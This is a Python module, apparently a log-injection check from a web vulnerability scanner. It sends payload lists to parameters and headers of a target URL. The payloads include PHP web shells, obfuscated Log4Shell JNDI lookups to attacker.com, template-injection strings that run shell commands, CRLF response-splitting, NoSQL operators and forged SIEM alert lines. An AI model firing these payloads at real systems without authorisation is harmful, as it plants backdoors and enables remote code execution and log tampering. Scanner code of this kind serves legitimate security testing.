import requests
import re
import time
from . import get_session

# Advanced log injection payloads organized by target and technique
LOG_INJECTION_PAYLOADS = {
    "basic": [
        # Basic injections for initial testing
        "'\n<?php system($_GET['cmd']); ?>\n'",
        "';echo 'LOG_INJECTION_TEST';'",
        "\nLOG_INJECTION_TEST\n",
        "<?php phpinfo(); ?>",
    ],
    
    "headers": [
        # Header-based attacks
        {"User-Agent": "<?php system($_GET['cmd']); ?>"},
        {"User-Agent": "Mozilla/5.0<?php phpinfo(); ?>"},
        {"Referer": "https://example.com/<?php echo 'LOG_INJECTION_TEST';?>"},
        {"X-Forwarded-For": "127.0.0.1\n<?php system($_GET['cmd']); ?>"},
        {"Accept-Language": "en-US;<?php passthru($_GET['c']); ?>"},
        {"Cookie": "PHPSESSID=<?php eval($_POST['x']); ?>"}
    ],
    
    "log4j": [
        # Log4j/Log4Shell variants
        "${jndi:ldap://attacker.com/a}",
        "${jndi:ldap://${hostName}.attacker.com/a}",
        "${${lower:j}${lower:n}${lower:d}i:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/a}",
        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}"
    ],
    
    "template": [
        # Template injection in logs
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    ],
    
    "js_console": [
        # JavaScript payloads for browser console logs
        "<script>console.error('LOG_INJECTION_TEST')</script>",
        "<img src=x onerror='console.error(\"LOG_INJECTION_TEST\")'/>",
        "<svg onload='console.log(\"LOG_INJECTION_TEST\")'></svg>",
        "<iframe onload=\"console.warn('LOG_INJECTION_TEST')\"></iframe>"
    ],
    
    "bypass": [
        # Newline/carriage return bypasses
        "user%0Aand%0AmaliciousContent",
        "param%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a",
        "x%0Aid%0Ax",  # Inject newline in the middle
        "param\r\u0000\nmalicious",  # Null byte with CRLF
        "param\r\tmalicious", # Tab after CR
        "%E5%98%8A%E5%98%8DmaliciousContent" # Unicode CRLF
    ],
    
    "nosql": [
        # NoSQL injection patterns in logs
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "function(){return true}"}',
        '{"username":{"$regex":"^admin"}}'
    ],
    
    "ansi": [
        # ANSI terminal escape codes (for colorized logs)
        "\x1b[31mRED_TEXT\x1b[0m",
        "\x1b[1;31;40mBRIGHT_RED_ON_BLACK\x1b[0m",
        "\x1b[?7l\x1b[31mTEXT\x1b[0m\x1b[?7h", # Disable line wrapping, potentially garbling log displays
        "\x1b[0m\x1b[1;31m\x1b[11@INJECTED\x1b[0m" # Character insertion control sequence
    ],
    
    "exotic": [
        # Log injection with advanced format breaking techniques
        "%{:,",           # Ruby format string injection
        "<@&TEST>",       # Discord-style ping format
        "*`id`*",         # Markdown code execution
        "$(hostname)",    # Shell expansion in templated logs
        "<!--LOG_TEST-->" # XML/HTML comment injection
    ]
}

# Indicators that may suggest successful log injection
LOG_INDICATORS = [
    "log", "error", "warning", "notice", "info", "debug", "trace",
    "Fatal", "Exception", "SQL syntax", "syntax error", "stack trace",
    "Successfully logged", "Log file", "logged", "logger"
]

def check(url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Get baseline response
    try:
        baseline_start = time.time()
        baseline_response = req_session.get(url, timeout=5)
        baseline_time = time.time() - baseline_start
        baseline_content = baseline_response.text
        baseline_length = len(baseline_content)
    except Exception:
        # Continue without baseline if we can't get it
        baseline_time = 1.0
        baseline_content = ""
        baseline_length = 0
    
    # Test for parameter-based log injection - start with basic payloads
    input_params = ["q", "search", "query", "id", "user", "username", "email", 
                   "log", "logger", "debug", "verbose", "detail", "view", "level", "msg"]
    
    vulnerable_params = set()
    tested_patterns = set()
    
    # First pass: try basic payloads on all parameters
    for param in input_params:
        for payload in LOG_INJECTION_PAYLOADS["basic"]:
            evidence_key = f"{param}:{payload[:20]}"
            if evidence_key in tested_patterns:
                continue
                
            tested_patterns.add(evidence_key)
            
            try:
                start_time = time.time()
                r = req_session.get(url, params={param: payload}, timeout=5)
                execution_time = time.time() - start_time
                
                # Look for evidence the payload might be logged
                if any(indicator in r.text.lower() for indicator in LOG_INDICATORS):
                    findings.append(f"Potential log injection point: parameter '{param}' with payload: {payload[:20]}...")
                    vulnerable_params.add(param)
                    break  # Found vulnerability with this parameter, try next one
                
                # Check for significant response time differences
                if execution_time > (baseline_time * 3) and execution_time > 1.5:
                    findings.append(f"Potential log injection point (time-based): parameter '{param}'")
                    vulnerable_params.add(param)
                    break
                
                # Check for significant content length changes
                content_diff = abs(len(r.text) - baseline_length)
                if baseline_length > 0 and content_diff > (baseline_length * 0.3):
                    findings.append(f"Potential log injection point (content-diff): parameter '{param}'")
                    vulnerable_params.add(param)
                    break
                    
            except Exception:
                continue
    
    # Second pass: try more payloads on vulnerable parameters
    if vulnerable_params:
        for param in vulnerable_params:
            # Test some template injection payloads
            for payload in LOG_INJECTION_PAYLOADS["template"][:2]:
                try:
                    r = req_session.get(url, params={param: payload}, timeout=5)
                    # Look for evidence of successful template evaluation
                    if "49" in r.text and "49" not in baseline_content:  # Result of 7*7
                        findings.append(f"Potential template injection in logs: parameter '{param}' with payload: {payload}")
                except Exception:
                    continue
            
            # Test some log4j payloads
            for payload in LOG_INJECTION_PAYLOADS["log4j"][:2]:
                try:
                    r = req_session.get(url, params={param: payload}, timeout=5)
                    # We might not directly see evidence, but note the test was performed
                    findings.append(f"Log4j/Log4Shell payload tested: parameter '{param}' - verify with out-of-band detection")
                except Exception:
                    continue
    
    # Test for HTTP header injection in logs - these are often logged
    all_header_payloads = LOG_INJECTION_PAYLOADS["headers"] + [{"User-Agent": p} for p in LOG_INJECTION_PAYLOADS["basic"][:2]]
    
    for header_payload in all_header_payloads:
        try:
            header_name = list(header_payload.keys())[0]
            header_value = header_payload[header_name]
            
            header = {header_name: header_value}
            r = req_session.get(url, headers=header, timeout=5)
            
            # Look for evidence in the response
            if any(indicator in r.text.lower() for indicator in LOG_INDICATORS):
                findings.append(f"Potential log injection via HTTP header: {header_name}")
        except Exception:
            continue
    
    # Test for CRLF injection in User-Agent header (often logged)
    for payload in LOG_INJECTION_PAYLOADS["bypass"][:3]:
        try:
            r = req_session.get(url, headers={"User-Agent": f"Mozilla/5.0 {payload}"}, timeout=5)
            
            # Check for significant content changes
            if len(r.text) != baseline_length and abs(len(r.text) - baseline_length) > 50:
                findings.append(f"Potential CRLF injection in User-Agent header: {payload[:30]}...")
        except Exception:
            continue
            
    # Test for error triggering to verify logging
    error_triggers = [
        {"param": "error", "value": "1/0"},
        {"param": "debug", "value": "true"},
        {"param": "test", "value": "undefined()"},
        {"url": f"{url}/nonexistent-page-{int(time.time())}.php"}
    ]
    
    for trigger in error_triggers:
        try:
            if "url" in trigger:
                r = req_session.get(trigger["url"], timeout=3)
            else:
                r = req_session.get(url, params={trigger["param"]: trigger["value"]}, timeout=3)
                
            # Check if we got error indicators in the response
            has_error = any(err in r.text.lower() for err in [
                "error", "exception", "stack trace", "not found", "undefined", 
                "division by zero", "fatal", "warning"
            ])
            
            if has_error:
                findings.append("Check logs for injected content. If input not sanitized, logs may be polluted.")
                break
        except Exception:
            continue
    
    return findings

# === Exotic Payloads Enhancement ===

# Log injection with SIEM breaking format
#    "X-Forwarded-For: 127.0.0.1\\nCRITICAL[auth_bypass]",
#    "User-Agent: \\n[ALERT] RCE triggered"
